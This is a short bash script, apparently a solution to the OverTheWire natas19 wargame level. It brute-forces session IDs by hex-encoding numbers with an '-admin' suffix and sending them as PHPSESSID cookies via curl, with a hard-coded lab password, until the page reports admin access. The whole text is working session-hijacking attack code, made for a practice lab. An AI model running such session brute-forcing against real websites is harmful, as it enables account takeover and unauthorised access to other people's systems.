for i in `seq 640`
do
	hex_=""
	for ((j=0;j<${#i};j++));
	do
		hex_+=$(printf %02X \'${i:$j:1})
	done

	val=$(curl -isu natas19:4IwIrekcuZlA9OsjOkoUtwU6lhokCPYs http://natas19.natas.labs.overthewire.org/ --cookie "PHPSESSID=${hex_}2d61646d696e")
	if [[ $val =~ "You are an admin" ]]; then
		echo "$val"
		break
	fi
	
done
